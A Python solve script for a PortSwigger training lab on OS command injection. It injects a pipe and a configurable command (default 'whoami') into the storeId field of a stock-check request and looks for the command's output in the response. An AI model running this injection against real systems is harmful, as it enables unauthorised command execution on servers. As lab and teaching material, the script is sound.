#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: OS command injection, simple case.

The /product/stock endpoint concatenates productId and storeId into a shell
command. Injecting `|whoami` into storeId chains a second command whose
output replaces the stock count in the response.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(description="Solve OS Command Injection Lab 1")
    parser.add_argument("lab_url", help="Lab URL")
    parser.add_argument("--product-id", default="1")
    parser.add_argument("--store-id", default="1")
    parser.add_argument("--cmd", default="whoami", help="Command to inject after the pipe")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    data = {
        "productId": args.product_id,
        "storeId": f"{args.store_id}|{args.cmd}",
    }
    r = s.post(f"{lab}/product/stock", data=data)

    print(f"[*] Status: {r.status_code}")
    print(f"[*] Response body (first 500 chars):\n{r.text[:500]}")

    # Look for a unix-like username in the response
    m = re.search(r"[a-z][a-z0-9_-]{3,}", r.text.strip())
    if m and r.status_code == 200:
        print(f"\n[+] Likely whoami output: {m.group(0)}")
        print("[+] Lab should be marked solved.")
    else:
        print("\n[-] Didn't see username-like output — try adjusting product/store IDs.")


if __name__ == "__main__":
    main()
